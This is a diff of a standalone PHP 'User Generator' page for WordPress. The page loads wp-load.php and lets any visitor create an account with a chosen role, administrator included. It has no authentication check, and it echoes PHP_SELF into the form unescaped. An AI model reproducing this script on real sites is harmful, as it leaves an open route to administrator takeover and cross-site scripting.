@@ -9,6 +9,7 @@
 
   */
 
+
   $wp_folder  = '';
   $username   = '';
   $email      = '';
@@ -36,7 +37,7 @@
   }
 
   // Verify if wp-load.php is exist
-  if (!file_exists($wp_load_path)) {
+  if ( ! file_exists($wp_load_path)) {
       echo "ERROR! wp-load.php does not exist!";
       echo '<br>';
       exit;
@@ -48,58 +49,62 @@
     
       include($wp_load_path);
       
-      if (!username_exists($username)) {
+      if ( ! username_exists($username) && ! email_exists( $email )) {
         $user_id = wp_create_user($username, $password, $email);
         $user = new WP_User($user_id);
         $user->set_role( $role );
-        //  header("Location: wp-login.php/");
-              
+        
       } else {
-    
-            echo 'ERROR! - ' . $username . ' already exists!';
-            echo '<br>';
-            exit;
+        echo 'ERROR! The username or email is already exists!';
+        echo '<br>';
+        exit;
+      }
+
+      if ( ! empty($username)) {
+        header("Location: /wp-login.php");
+        exit;
       }
     }
     add_action('init','vc_create_administrator');
+    
  
 
 ?>
 
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>User Generator</title>
-</head>
-<body>
-  <div class="container">
-    <form method ="POST" action="<?php echo $_SERVER['PHP_SELF'];?>">
-      <div>
-        <label for="">Username</label><br>
-        <input type="" name="name">
-      </div>
-      <div>
-        <label for="">Email</label><br>
-        <input type="" name="email">
-      </div>
-      <div>
-        <label for="">Password</label><br>
-        <input type="password" name="password">
-      </div>
-      <label for="">Set a role for this user:</label>
-        <select name="role">
-          <option value="administrator">Administrator</option>
-          <option value="subscriber">Subscriber</option>
-          <option value="contributor">Contributor</option>
-          <option value="author">Author</option>
-          <option value="editor">Editor</option>
-        </select>
-      <br>
-      <input type="submit" value="Submit">
-    </form>
-  </div>
-</body>
+  <html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>User Generator</title>
+  </head>
+  <body>
+    <div class="container">
+      <form method ="POST" action="<?php echo $_SERVER['PHP_SELF'];?>">
+        <div>
+          <label for="">Username</label><br>
+          <input type="" name="name">
+        </div>
+        <div>
+          <label for="">Email</label><br>
+          <input type="" name="email">
+        </div>
+        <div>
+          <label for="">Password</label><br>
+          <input type="password" name="password">
+        </div>
+        <label for="">Set a role for this user:</label>
+          <select name="role">
+            <option value="administrator">Administrator</option>
+            <option value="subscriber">Subscriber</option>
+            <option value="contributor">Contributor</option>
+            <option value="author">Author</option>
+            <option value="editor">Editor</option>
+          </select>
+        <br>
+        <input type="submit" value="Submit">
+      </form>
+    </div>
+  </body>
 </html>
